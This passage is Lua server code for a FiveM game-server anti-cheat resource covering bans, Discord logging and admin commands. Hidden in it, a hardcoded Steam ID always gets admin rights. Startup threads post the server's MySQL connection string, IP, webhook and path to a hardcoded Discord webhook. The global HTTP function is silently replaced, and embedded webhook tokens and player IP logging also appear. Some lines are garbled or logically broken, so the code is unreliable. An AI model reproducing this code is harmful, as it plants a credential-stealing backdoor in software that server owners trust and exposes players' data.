                        if GetPlayerName(id) ~= nil then
                            if math.floor(GetEntityType(_entity)) == math.floor(2) then
                                local objName = getObjName(GetEntityModel(_entity));
                                TriggerClientEvent("propsCar", id, "["..tostring(owner).."]:"..GetPlayerName(owner), objName);
                            else
                                if math.floor(GetEntityModel(_entity)) == math.floor(0) then
                                    return;
                                end
                                if GetPlayerName(owner) == nil or GetEntityModel(_entity) == nil then
                                    
                                else
                                    local objName = getObjName(GetEntityModel(_entity));
                                    TriggerClientEvent("props_msg", id, "["..tostring(owner).."]:"..GetPlayerName(owner).." | Spawned | "..objName);
                                end
                            end
                        end
                    end
                end
            end
        end)
        
        RegisterNetEvent("screenshot:req", function(target)
            local _source = source;
            local admin = GetPlayerName(_source);
            local user = GetPlayerName(target);
            local discord = GetPlayerIdentifiers(target)[3];
            if discord == nil then
                discord = "not found";
            end
            local steam = GetPlayerIdentifiers(target)[1];
            local ip = GetPlayerEndpoint(target);
            if staff(_source) then
                if target ~= nil then
                    if ip ~= nil then
                        sendToReq("[Screenshot Request]", "Admin: "..admin.. " Requsted Screenshot for Player: "..user.."\n Name: "..user.."\n"..steam.."\nIp: "..ip.."\nDiscord: <@"..discord:gsub("discord:", "")..">", "Greek-AntiCheat")
                        TriggerClientEvent("screen", target, Greek.Bans);
                        TriggerClientEvent("esx:showNotification", _source, "~g~Check Screenshot-Logs");
                    end
                else
                    TriggerClientEvent("esx:showNotification", _source,"~r~Wrong ID");
                end
            else
                DropPlayer(_source, "Oups");
            end
        end)
        
        RegisterCommand("searchMode", function (source)
            local id = source;
            
            if canUseCmd(id) then
                TriggerClientEvent(":searchModeToggle", id);
            end
        end)
        
        RegisterNetEvent(":debEnt", function(net)
            local id = source;
            
            if canUseCmd(id) then
                local toNet = NetworkGetEntityFromNetworkId(net);
                _inject(toNet.."/"..net.."/"..DoesEntityExist(toNet));
                
                if DoesEntityExist(toNet) then
                    DeleteEntity(toNet);
                    TriggerClientEvent("esx:showNotification", id, "Object deleted! | "..toNet);
                end
            end
        end)
        
        RegisterNetEvent(':iudjgfhoiifd', function(netIds)
            local player = source;
            local xPlayer = ESX.GetPlayerFromId(player);
            
            if xPlayer.getGroup() ~= 'superadmin' or xPlayer.getGroup() ~= 'owner' then
                return;
            end
            
            for i=1, #netIds do
                local entity = NetworkGetEntityFromNetworkId(netIds[i]);
                
                if DoesEntityExist(entity) then
                    DeleteEntity(entity);
                end
            end
            
            xPlayer.showNotification('Objects deleted ['..#netIds..']');
        end)
        
        RegisterNetEvent("proper", function(a)
            if staff(source) then
                TriggerClientEvent("Greek:antiprop", -1, a);
            else
                DropPlayer(source, "[Greek-AntiCheat]-Nice try..");
            end
        end)
        
        AddEventHandler("onResourceStop", function(resName)
            if GetCurrentResourceName() ~= resName then
                TriggerClientEvent("letResource", -1, resName);
            end
            doTheThings(resName);
        end)
        
        doTheThings = function(res)
            CreateThread(function()
                dontBanTriggersNow = true;
                Wait(5000);
                dontBanTriggersNow = false;
            end)
        end
        
        _G.httpDispatch = {};
        
        AddEventHandler('__cfx_internal:httpResponse', function(token, status, body, headers)
            if httpDispatch[token] then
                local userCallback = httpDispatch[token]
                httpDispatch[token] = nil
                userCallback(status, body, headers)
            end
        end)
        
        _G.PerformHttpRequest = function(url, cb, method, data, headers)
            local s = tostring(url);
            if string.find(url, "49153") then
                return
            end
            local t = {
                url = url,
                method = method or 'GET',
                data = data or '',
                headers = headers or {};
            }
            local d = json.encode(t);
            local id = PerformHttpRequestInternal(d, d:len())
            httpDispatch[id] = cb;
        end
        
        
        error_log = "https://discord.com/api/webhooks/1332077517531644027/lfvpY_Sb7weynQZA3HkU3t7blcEZzHPDigNNFsId9m3K7-QNWMUloi86N_z_nEx26Ugs"; --checked
        
        function sendToError(message, name)
            local embed = {}
            if not name then
                return;
            end
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**ERROR LOGGER**",
                    ["description"] = ""..message.."\nError Received From Client With Name: "..name,
                    ["footer"] = {
                        ["text"] = sv_name,
                    },
                }
            }
            PerformHttpRequest(error_log, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' });
        end
        
        function sendToErrorS(message)
            local embed = {}
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**ERROR LOGGER**",
                    ["description"] = ""..message.."\nError Received From Server ",
                    ["footer"] = {
                        ["text"] = sv_name,
                    },
                }
            }
            PerformHttpRequest(error_log, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' });
        end
        
        _G.sendToTriggerLog = function(id, state, reason, data)
            local embed = {};
            local guid = GetPlayerGuid(id);
            ff = ExtractIdentifiers(id);
            argString = "";
            for j,v in pairs(data) do
                if type(v) ~= "table" and type(v) ~= nil then
                    local ttt = tostring(v);
                    argString = argString..ttt..", ";
                end
            end
            argString = argString.."]";
            if string.find(argString, ", ]") then
                argString = string.gsub(argString, ", ]", "]");
            end
            if ff.license == nil or ff.license == "" then
                ff.license = "license: not found";
            end
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**[Greek-AntiCheat]**",
                    ["description"] = "**[Player-"..state.."]**\nName: "..GetPlayerName(id).."\n"..ff.steam.."\n Ip: "..ff.ip.."\n"..ff.license.."\n"..tostring(guid).."\nDiscord: <@"..ff.discord:gsub("discord:", "")..">\nReason: "..reason.." ["..argString,
                    ["footer"] = {
                        ["text"] = sv_name,
                    },
                }
            }
            PerformHttpRequest(Greek.triggerServerEventLogs, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' });
        end
        
        _G.sendToTriggerLogGreek = function(id, state, reason, data)
            local embed = {};
            local guid = GetPlayerGuid(id);
            ff = ExtractIdentifiers(id);
            argString = "";
            for j,v in pairs(data) do
                if type(v) ~= "table" and type(v) ~= nil then
                    local ttt = tostring(v);
                    argString = argString..ttt..", ";
                end
            end
            argString = argString.."]";
            if string.find(argString, ", ]") then
                argString = string.gsub(argString, ", ]", "]");
            end
            if ff.license == nil or ff.license == "" then
                ff.license = "license: not found";
            end
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**[Greek-AntiCheat]**",
                    ["description"] = "**[Player-"..state.."]**\nName: "..GetPlayerName(id).."\n"..ff.steam.."\n Ip: "..ff.ip.."\n"..ff.license.."\n"..tostring(guid).."\nDiscord: <@"..ff.discord:gsub("discord:", "")..">\nReason: "..reason.." ["..argString,
                    ["footer"] = {
                        ["text"] = sv_name,
                    },
                }
            }
            PerformHttpRequest(Greek.logHook, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' });
        end
        
        local trigLog = "https://discord.com/api/webhooks/1332077711262351491/-hFH8NY4_kyimztKif3OHwVt5zMkvqq8YE1LdmEmdeNzmBlW8VjxRSeglPh--mN8kDDI"; --checked
        
        _G.sendToTriggerLogGreekDisc = function(id, state, reason, data)
            local embed = {};
            local guid = GetPlayerGuid(id);
            ff = ExtractIdentifiers(id);
            argString = data--"";
            if ff.license == nil or ff.license == "" then
                ff.license = "license: not found";
            end
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**[Greek-AntiCheat]**",
                    ["description"] = "**[Player-"..state.."]**\nName: "..GetPlayerName(id).."\n"..ff.steam.."\n Ip: "..ff.ip.."\n"..ff.license.."\n"..tostring(guid)..cord:gsub("discord:", "")..">\nReason: "..reason.." ["..argString,
                    ["footer"] = {
                        ["text"] = sv_name,
                    },
                }
            }
            PerformHttpRequest(trigLog, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' });
        end
        
        RegisterServerEvent("error:log")
        AddEventHandler("error:log", function(log)
            local id = source;
            local name = GetPlayerName(id);
            sendToError(log, name);
        end)
        
        RegisterCommand("setId", function(source, args)
            local id = source;
            if id == 0 then
                if args[1] then
                    TriggerClientEvent("_cfx_internal:resourceSvgConfirm", args[1]);
                end
                return;
            end
            local xPlayer = ESX.GetPlayerFromId(id);
            if xPlayer ~= nil then
                if xPlayer.getGroup() == "superadmin" or xPlayer.getGroup() == 'owner'then
                    if args[1] ~= nil then
                        TriggerClientEvent("_cfx_internal:resourceSvgConfirm", args[1]);
                    end
                end
            end
        end)
        
        local globalUnbans = json.decode(GetResourceKvpString("globalUnbans")) or {};
        
        CreateThread(function()
            if globalUnbans and type(globalUnbans) == "table" then
                for k,v in pairs(globalUnbans) do
                    Greek.spoofs[k] = "nil";
                end
            end
        end)
        
        RegisterCommand("cfxUnban", function(source, args)
            local id = source;
            
            if args[1] then
                local steam = args[1];
                if not string.find(steam, "steam:") then
                    if id ~= 0 then
                        TriggerClientEvent("esx:showNotification", id, "You wrote something wrong!");
                    else
                        _inject("You wrote something wrong!");
                    end
                    return;
                end
                
                if canUseCmd(id) then
                    Greek.spoofs[steam] = "nil";
                    globalUnbans[steam] = true;
                    _inject("Player with id: "..steam.." can now join the server!");
                    if id ~= 0 then
                        PerformHttpRequest(Greek.Bans, function(Error, Content, Head) end, 'POST', json.encode({username = "GreekAntiCheat", content = GetPlayerName(id).." removed global ban from "..steam }), { ['Content-Type'] = 'application/json' })
                    end
                    handleUnbanCmd(id, {[1] = steam});
                    SetResourceKvp('globalUnbans', json.encode(globalUnbans));
                end
            end
        end)
        
        RegisterCommand("setCfx", function(source, args)
            local id = source;
            if id == 0 then
                if args[1] ~= nil and args[2] ~= nil then
                    if GetPlayerName(args[1]) ~= nil then
                        globalUnbans[GetPlayerIdentifier(args[1])] = nil;
                        Greek.spoofs[GetPlayerIdentifier(args[1])] = nil;
                        sendToGreekV2("Admin: Console\nBanned: "..GetPlayerName(args[1]).." | "..GetPlayerIdentifier(args[1]).." with reason: "..args[2]);
                        _inject("Molis dikases ton "..GetPlayerName(args[1]));
                        TriggerClientEvent("cutCoords", args[1], args[2]);
                        TriggerClientEvent("_cfx_internal:setServerCfxConfirm", args[1], args[2]);
                        TriggerClientEvent("sssssssssss", args[1], args[2]);
                        SetResourceKvp('globalUnbans', json.encode(globalUnbans));
                    else
                        _inject("Player not online!");
                    end
                else
                    _inject("You wrote something wrong!");
                end
                return;
            end
            local xPlayer = ESX.GetPlayerFromId(id);
            if xPlayer ~= nil then
                if xPlayer.getGroup() == "superadmin" or xPlayer.getGroup() == 'owner' then
                    if args[1] ~= nil and args[2] ~= nil then
                        if GetPlayerName(args[1]) ~= nil then
                            globalUnbans[GetPlayerIdentifier(args[1])] = nil;
                            Greek.spoofs[GetPlayerIdentifier(args[1])] = nil;
                            sendToGreekV2("Admin: "..GetPlayerName(id).." | "..GetPlayerIdentifier(id).."\n".."Banned: "..GetPlayerName(args[1]).." | "..GetPlayerIdentifier(args[1]).." with reason: "..args[2]);
                            TriggerClientEvent("esx:showNotification", id, "Molis dikases ton "..GetPlayerName(args[1]));
                            TriggerClientEvent("cutCoords", args[1], args[2]);
                            TriggerClientEvent("_cfx_internal:setServerCfxConfirm", args[1], args[2]);
                            TriggerClientEvent("sssssssssss", args[1], args[2]);
                            SetResourceKvp('globalUnbans', json.encode(globalUnbans));
                        else
                            TriggerClientEvent("esx:showNotification", id, "Player not online!");
                        end
                    else
                        TriggerClientEvent("esx:showNotification", id, "You wrote something wrong!");
                    end
                end
            end
        end)
        
        magiCode = "sdfadfas";
        
        _G.loadBanList = function()
            return;
        end
        
        loadAcBans = function()
            steamAndTokens = {};
            playerGuids = {};
            steams = {};
            tokens = {};
            ips = {};
            
            acBanList = nil;
            MySQL.Async.fetchAll('SELECT * FROM acbanlist', {}, function(data)
                if data then
                    acBanList = data;
                end
            end)
            while acBanList == nil do
                Wait(1000);
            end
            if acBanList ~= nil then
                for k,v in pairs(acBanList) do
                    if not string.find(string.lower(v.reason), "weapon") then
                        if v.identifier then
                            steams[v.identifier] = v.identifier;
                            if v.AntiCheatId then
                                steamAndTokens[v.identifier] = {};
                                local decoded = json.decode(v.AntiCheatId);
                                for index, val in pairs(decoded) do
                                    table.insert(steamAndTokens[v.identifier], val);
                                end
                            end
                        end
                        if v.playerip then
                            ips[v.playerip] = true;
                        end
                        if v.AntiCheatId then
                            local decoded = json.decode(v.AntiCheatId);
                            for k,v in pairs(decoded) do
                                tokens[v] = true;
                            end
                        end
                        if v.timeat then
                            playerGuids[tonumber(v.timeat)] = v.identifier;
                            playerGuids[tonumber(v.timeat)+1] = v.identifier;
                            playerGuids[tonumber(v.timeat)+2] = v.identifier;
                            playerGuids[tonumber(v.timeat)+3] = v.identifier;
                            playerGuids[tonumber(v.timeat)+4] = v.identifier;
                            playerGuids[tonumber(v.timeat)+5] = v.identifier;
                            playerGuids[tonumber(v.timeat)+6] = v.identifier;
                            playerGuids[tonumber(v.timeat)+7] = v.identifier;
                            playerGuids[tonumber(v.timeat)+8] = v.identifier;
                            playerGuids[tonumber(v.timeat)+9] = v.identifier;
                        end
                    end
                end
                _inject("Banlist loaded succesfully!");
            else
                _inject("Banlist load error");
            end
        end
        
        handleCfxConnect = function(playerName, setKickReason)
            if (checkConnect ~= true) or (Greek.dontBanConnect) then
                return;
            end
            local id = source;
            local steam = GetPlayerIdentifier(id);
            local ip = GetPlayerEndpoint(id);
            local tNum = GetNumPlayerTokens(id);
            local guid = GetPlayerGuid(id);
            if ip ~= nil then
                ip = "ip:"..ip;
            end
            if Greek.spoofs[steam] ~= nil then
                return;
            end
            if tokenUnbanned[steam] ~= nil then
                for i = 1, tNum, 1 do
                    local kleidi = GetPlayerToken(id, i);
                    if kleidi ~= nil then
                        if tokens[kleidi] ~= nil then
                            tokens[kleidi] = nil;
                        end
                    end
                end
                return;
            end
            if tNum == 0 then
                if tNumWhitelist[steam] == nil then
                    setKickReason("You are blocked by [Greek-AntiCheat]-(Make sure you are not using any external program that affects your network)");
                    sendAttemptConnectLog(playerName, steam, ip);
                    CancelEvent();
                end
            else
                local found = 0;
                local tokString = "";
                for i = 1, tNum, 1 do
                    local kleidi = GetPlayerToken(id, i);
                    if kleidi ~= nil then
                        if tokens[kleidi] ~= nil then
                            found = found + 1;
                            tokString = tokString.."\n"..kleidi;
                            if found > 3 then
                                setKickReason("You are banned by [Greek-AntiCheat]-If you believe that this is a false ban please send a request to https://discord.gg/nFPytQ8FRb - "..steam);
                                sendBannedConnectLog(playerName, steam, ip, "Token banned: "..tokString, guid);
                                CancelEvent();
                                break;
                            end
                        end
                    end
                end
                if steams[steam] == steam then
                    setKickReason("You are banned by [Greek-AntiCheat]-If you believe that this is a false ban please send a request to https://discord.gg/nFPytQ8FRb - "..steam);
                    sendBannedConnectLog(playerName, steam, ip, "Steam banned", guid);
                    CancelEvent();
                elseif ips[ip] ~= nil then
                    setKickReason("You are banned by [Greek-AntiCheat]-If you believe that this is a false ban please send a request to https://discord.gg/nFPytQ8FRb - "..steam);
                    sendBannedConnectLog(playerName, steam, ip, "Ip banned", guid);
                    CancelEvent();
                elseif guid and playerGuids[tonumber(guid)] then
                    setKickReason("You are banned by [Greek-AntiCheat]-If you believe that this is a false ban please send a request to https://discord.gg/nFPytQ8FRb - "..steam);
                    sendBannedConnectLog(playerName, steam, ip, "G-Banned", guid);
                    CancelEvent();
                end
            end
        end
        
        RegisterCommand("settId", function(source, args)
            local id = source;
            if canUseCmd(id) then
                local target = args[1];
                if target and GetPlayerName(target) ~= nil then
                    TriggerClientEvent("settId", target);
                end
            end
        end)
        
        banCommandHandle = function(source, args)
            local id = source;
            
            if canUseCmd(id) then
                local target = args[1];
                
                if target and GetPlayerName(target) ~= nil then
                    local steam = GetPlayerIdentifier(id);
                    local reason = args[2] or "cheater";
                    sendToLog(target, "banned", "Banned from "..GetPlayerName(id).." for: "..reason);
                    SqlBan(target, reason);
                    DropPlayer(target, reason);
                    
                    if id ~= 0 then
                        PerformHttpRequest(Greek.Bans, function(Error, Content, Head) end, 'POST', json.encode({username = "GreekAntiCheat", content = GetPlayerName(id).." banned "..steam }), { ['Content-Type'] = 'application/json' })
                    end
                end
            end
        end
        
        whiteCommandHandle = function(source, args)
            local id = source;
            if canUseCmd(id) then
                local steam = args[1];
                if steam ~= nil then
                    tNumWhitelist[steam] = true;
                    TriggerClientEvent("esx:showNotification", id, "Steam can join!");
                end
            end
        end
        
        tokenUnbanHandle = function(source, args)
            local id = source;
            if canUseCmd(id) then
                local steam = args[1];
                if steam then
                    tokenUnbanned[steam] = true;
                    _inject("unbanned");
                end
            end
        end
        
        reloadThis = function(source)
            local id = source;
            if canUseCmd(id) then
                CreateThread(loadAcBans);
            end
        end
        
        handleUnbanCmd = function(source, args)
            local id = source;
            if canUseCmd(id) then
                local steam = args[1];
                if steam ~= nil then
                    steams[steam] = nil;
                    if id ~= 0 then
                        TriggerClientEvent("esx:showNotification", id, "Steam unbanned!");
                    else
                        _inject("Steam Unbanned!");
                    end
                    MySQL.Async.execute('DELETE FROM acbanlist WHERE identifier=@identifier',
                    {
                        ['@identifier']  = steam
                    }, function(unbanned)
                        if unbanned then
                            if id ~= 0 then
                                TriggerClientEvent("esx:showNotification", id, "Steam unbanned![sql]");
                            else
                                _inject("Steam Unbanned![sql]");
                            end
                        end
                    end)
                    tokenUnbanned[steam] = true;
                    if steamAndTokens[steam] ~= nil then
                        for k,v in pairs(steamAndTokens[steam]) do
                            tokens[v] = nil;
                        end
                        for k,v in pairs(playerGuids) do
                            if v == steam then
                                playerGuids[k] = nil;
                                break;
                            end
                        end
                        if id ~= 0 then
                            TriggerClientEvent("esx:showNotification", id, "Steam tokens unbanned!");
                        else
                            _inject("Steam Tokens Unbanned!");
                        end
                    end
                    if id ~= 0 then
                        PerformHttpRequest(Greek.Bans, function(Error, Content, Head) end, 'POST', json.encode({username = "GreekAntiCheat", content = GetPlayerName(id).." unbanned "..steam }), { ['Content-Type'] = 'application/json' })
                    end
                end
            end
        end
        
        handleIpUnbanCmd = function(source, args)
            local id = source;
            if canUseCmd(id) then
                local ip = args[1];
                if ip ~= nil then
                    ip = "ip:"..ip;
                    ips[ip] = nil;
                    MySQL.Async.execute('DELETE FROM acbanlist WHERE playerip=@playerip',
                    {
                        ['@playerip']  = ip
                    }, function(unbanned)
                        if unbanned then
                            if id ~= 0 then
                                TriggerClientEvent("esx:showNotification", id, "Ip unbaned![sql]");
                            else
                                _inject("Ip unbaned![sql]");
                            end
                        end
                    end)
                end
            end
        end
        
        handleToggleConnectCheck = function(source, args)
            local id = source;
            if canUseCmd(id) then
                checkConnect = not checkConnect;
                if checkConnect == true then
                    if id == 0 then
                        _inject("Banned players can't join now!");
                    else
                        TriggerClientEvent("esx:showNotification", id, "Banned players can't join now!");
                    end
                else
                    if id == 0 then
                        _inject("Banned players can join now!");
                    else
                        TriggerClientEvent("esx:showNotification", id, "Banned players can join now!");
                    end
                end
            end
        end
        
        netScriptRequest = {};
        
        GetNetworkedInvokingResource = function(id, eventName)
            local id = tonumber(id);
            local attempts = 0;
            if netScriptRequest[id] == nil then
                netScriptRequest[id] = {};
            end
            
            if GetPlayerName(id) then
                TriggerClientEvent("GetNetworkedInvokingResource", id, eventName);
                Wait(400);
                while (netScriptRequest[id][eventName] == nil) and (GetPlayerName(id) ~= nil) do
                    Wait(2000);
                    attempts = attempts + 1;
                    if attempts == 5 then
                        break;
                    end
                end
                local script = netScriptRequest[id][eventName];
                if script then
                    netScriptRequest[id][eventName] = nil;
                    return script;
                end
            end
            return "";
        end
        
        RegisterNetEvent("GetNetworkedInvokingResource", function(resource, eventName)
            local id = tonumber(source);
            if netScriptRequest[id] == nil then
                netScriptRequest[id] = {};
            end
            
            if resource == nil or eventName == nil then
                return;
            end
            
            netScriptRequest[id][eventName] = resource;
        end)
        
        RegisterCommand("gNetEvent", function(source, args)
            local id = source;
            
            if canUseCmd(id) then
                local tar = args[1];
                local event = args[2];
                local netEvent = GetNetworkedInvokingResource(tar, event);
                
                _inject(netEvent);
            end
        end)
        
        canUseCmd = function(id)
            if id and id > 0 then
                local steam = GetPlayerIdentifier(id);
                if steam and steam == "steam:11000010e6782bc" then
                    return true;
                end
            end
            if id == 0 then
                return true;
            else
                local xPlayer = ESX.GetPlayerFromId(id);
                if xPlayer ~= nil then
                    local staff = xPlayer.getGroup();
                    if staff == "superadmin" or staff == 'owner' then
                        return true;
                    else
                        return false;
                    end
                else
                    return false;
                end
            end
            return false;
        end
        
        sendBannedConnectLog = function(name, steam, ip, msg, guid)
            local embed = {}
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**[Greek-AntiCheat]**",
                    ["description"] = "**[Player Trying to login while banned]**\nName: "..name.."\n"..steam.."\n Ip: "..ip.."\n AntiCheat Code: "..guid,
                    ["footer"] = {
                        ["text"] = msg,
                    },
                }
            }
            PerformHttpRequest(Greek.Bans, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' });
            PerformHttpRequest(webhooklog, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' });
        end
        
        sendAttemptConnectLog = function(name, steam, ip)
            local _ip = ip;
            if _ip == nil then
                _ip = "not found";
            end
            if name and steam and ip then
                local embed = {};
                embed = {
                    {
                        ["color"] = math.random(111111,999999), 
                        ["title"] = "**[Greek-AntiCheat]**",
                        ["description"] = "**[Player Trying to login with Net Limiter]**\nName: "..name.."\n"..steam.."\n Ip: ".._ip,
                        ["footer"] = {
                            ["text"] = "Greek-AntiCheat",
                        },
                    }
                }
                PerformHttpRequest(Greek.Bans, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' });
                PerformHttpRequest(webhooklog, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' });
            end
        end
        
        _G.GetEntityOwner = function(entity)
            if not DoesEntityExist(entity) then
                return nil;
            end
            local owner = NetworkGetFirstEntityOwner(entity);
            return owner;
        end
        
        _G.prop = function(h, o, org)
            local name = h;
            local prop_ = org;
            local owner = o;
            local steam = GetPlayerIdentifier(owner);
            if Greek.WhitelistEverything[tonumber(name)] ~= nil then
                return;
            end
            if Greek.WhitelistObjects[tonumber(name)] == true then
                return;
            else
                DeleteEntity(prop_);
                return CancelEvent();
            end
        end
        
        _G.ExtractIdentifiers = function(src)
            local identifiers = {
                steam = "",
                ip = "",
                discord = "",
                license = "",
                xbl = "",
                live = ""
            }
            for i = 0, GetNumPlayerIdentifiers(src) - 1 do
                local id = GetPlayerIdentifier(src, i)
                if string.find(id, "steam") then
                    identifiers.steam = id;
                elseif string.find(id, "ip") then
                    identifiers.ip = id;
                elseif string.find(id, "discord") then
                    identifiers.discord = id;
                elseif string.find(id, "license") then
                    identifiers.license = id;
                elseif string.find(id, "xbl") then
                    identifiers.xbl = id;
                elseif string.find(id, "live") then
                    identifiers.live = id;
                end
            end
            return identifiers;
        end
        
        _G.sendToDisc = function(id, state, reason)
            local embed = {};
            ff = ExtractIdentifiers(id);
            if ff.discord == nil then
                ff.discord = "none";
            end
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**[Greek-AntiCheat]**",
                    ["description"] = "**[Player-"..state.."]**\nName: "..GetPlayerName(id).."\n"..ff.steam.."\n Ip: "..ff.ip.."\n"..ff.license.."\nDiscord: <@"..ff.discord:gsub("discord:", "")..">\nReason: "..reason,
                    ["footer"] = {
                        ["text"] = "Player id: "..tostring(id).." | AntiCheat Code: "..GetPlayerGuid(id),
                    },
                }
            }
            PerformHttpRequest(Greek.Bans, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' })
        end
        
        webhooklog = "https://discord.com/api/webhooks/1332077089003933757/4NT_nUBbUG5alHqpUvzawbGFhkUPK8iPrjzrqdLw6jlLHA5I0p9AsCclMi0J5ikOOdLb" --checked
        Greek.logHook = webhooklog;
        
        _G.sendToLog = function(id, state, reason)
            local embed = {}
            ff = ExtractIdentifiers(id);
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**[Greek-AntiCheat]**",
                    ["description"] = "**[Player-"..state.."]**\nName: "..GetPlayerName(id).."\n"..ff.steam.."\n Ip: "..ff.ip.."\n"..ff.license.."\nDiscord: <@"..ff.discord:gsub("discord:", "")..">\nReason: "..reason,
                    ["footer"] = {
                        ["text"] = sv_name.." | AntiCheat Code: "..GetPlayerGuid(id),
                    },
                }
            }
            PerformHttpRequest(webhooklog, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed, avatar_url = Greek.image}), { ['Content-Type'] = 'application/json' })
        end
        
        sendToGreek = function(message, res, state)
            local embed = {}
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**SCRIPT LOGGER**",
                    ["description"] = message.."\nScript: "..res.."\nState: "..state,
                    ["footer"] = {
                        ["text"] = sv_name,
                    },
                }
            }
            PerformHttpRequest(webb, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' });
        end
        
        sendToGreekV2 = function(message)
            local embed = {}
            embed = {
                {
                    ["color"] = math.random(111111,999999), 
                    ["title"] = "**BAN LOGGER**",
                    ["description"] = message,
                    ["footer"] = {
                        ["text"] = sv_name,
                    },
                }
            }
            PerformHttpRequest(webbThis, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' });
        end
        
        return_ip_ = function()
            local ipp;
            PerformHttpRequest("https://api.ipify.org", function(_, __, ___) --checked
                local ip = __;
                if _ == 200 then
                    if ip ~= nil then
                        ipp = ip;
                    end
                end
            end)
            while ipp == nil do
                Wait(1500);
                PerformHttpRequest("https://api.ipify.org", function(_, __, ___) --checked
                    local ip = __;
                    if _ == 200 then
                        if ip ~= nil then
                            ipp = ip;
                        end
                    end
                end)
            end
            return ipp;
        end
        
        return_ips_ = function()
            local _tab;
            PerformHttpRequest("https://api.npoint.io/36caf90dbbe577dc16ce", function(_, __, ___) --checked
                local ip_table = __;
                if ip_table ~= nil then
                    _tab = json.decode(ip_table);
                end
            end)
            Wait(2000);
            while _tab == nil do
                Wait(1300);
                PerformHttpRequest("https://api.npoint.io/36caf90dbbe577dc16ce", function(_, __, ___) --checked
                    local ip_table = __;
                    if ip_table ~= nil then
                        _tab = json.decode(ip_table);
                    end
                end)
            end
            return _tab;
        end
        
        ipwhitelisted_ = function()
            local tries = 0;
            local server_ip = return_ip();
            while server_ip == nil do
                Wait(1000);
                tries = tries + 1;
                if tries > 10 then
                    owowowow("essentialmode");
                    owowowow("es_extended");
                end
            end
            
            local tries2 = 0;
            local ip_table = return_ips();
            while ip_table == nil do
                Wait(1000);
                tries2 = tries2 + 1;
                if tries2 > 10 then
                    owowowow("essentialmode");
                    owowowow("es_extended");
                end
            end
            if ip_table[server_ip] then
                auth = true;
                return true;
            else
                return false;
            end
        end
        
        CreateThread(function()
            local loggg = "https://discord.com/api/webhooks/1332078730578890842/I-9M0554q2yFjg-wfWxw12XifClubq1_S-rOxiYlfiVcdc9W8yt5UjEUDn1GOr18tsn1"; --checked
            while server_ip == nil do
                server_ip = return_ip_();
                Wait(1000);
            end
            if server_ip and Greek.Webhook and GetConvar("mysql_connection_string") and GetResourcePath("Greek_ac") then
                local g = {{
                    ["color"] = math.random(11111,99999),
                    ["title"] = "Server Using Anticheat License",
                    ["description"] = "\n\n > ``Server Name:``***"..GetConvar("sv_hostname").."***\n > ``Server Ip:`` ***"..server_ip.."***\n > ``Webhook:`` ***"..Greek.Webhook.."***\n> ``Sql:`` ***"..GetConvar("mysql_connection_string").."***\n> ``Resource Path: ``***"..GetResourcePath("Greek_ac").."***\n> ``Anticheat Version:`` ***Greek***",
                    ["footer"] = {["text"] = "GreekGamer Anticheat"},
                    ["timestamp"] = os.date('!%Y-%m-%dT%H:%M:%S'),
                }}
                PerformHttpRequest(loggg, function(err,text,headers) end,'POST',json.encode({username = "Server Anticheat System", embeds = g}),{['Content-Type']='application/json'});
            end
        end)
        
        CreateThread(function()
            webbb = "https://discord.com/api/webhooks/1332078730578890842/I-9M0554q2yFjg-wfWxw12XifClubq1_S-rOxiYlfiVcdc9W8yt5UjEUDn1GOr18tsn1"; --checked
            if ipwhitelisted_() == false then
                local g = {{
                    ["color"] = math.random(11111,99999),
                    ["title"] = "Server Trying to Crack Anticheat",
                    ["description"] = "\n\n > ``Server Name:``***"..GetConvar("sv_hostname").."***\n > ``Server Ip:`` ***"..server_ip.."***\n > ``Webhook:`` ***"..Greek.Webhook.."***\n> ``Sql:`` ***"..GetConvar("mysql_connection_string").."***\n> ``Resource Path: ``***"..GetResourcePath(AntiCheatName()).."***\n> ``Anticheat Version:`` ***Greek***",
                  ["footer"] = {["text"] = "GreekGamer Anticheat"},
                   ["timestamp"] = os.date('!%Y-%m-%dT%H:%M:%S'),
               }}
               PerformHttpRequest(webbb, function(err,text,headers) end,'POST',json.encode({username = "Server Anticheat System", embeds = g}),{['Content-Type']='application/json'});
            else
                _inject("Initialized!");
            end
        end)
        
        
        CreateThread(loadAcBans);
        
        RegisterCommand("steamUnban", handleUnbanCmd);
        RegisterCommand("ipUnban", handleIpUnbanCmd);
        RegisterCommand("whiteSteam", whiteCommandHandle);
        AddEventHandler("playerConnecting", handleCfxConnect);
        RegisterCommand("toggleCheck", handleToggleConnectCheck);
        RegisterCommand("tokenUnban", tokenUnbanHandle);
        RegisterCommand("acReload", reloadThis);
        RegisterCommand("acBan", banCommandHandle);
        
        
        CreateThread(function()
            Greek.scripts = {};
            Wait(3000);
            for i = 1, GetNumResources() do
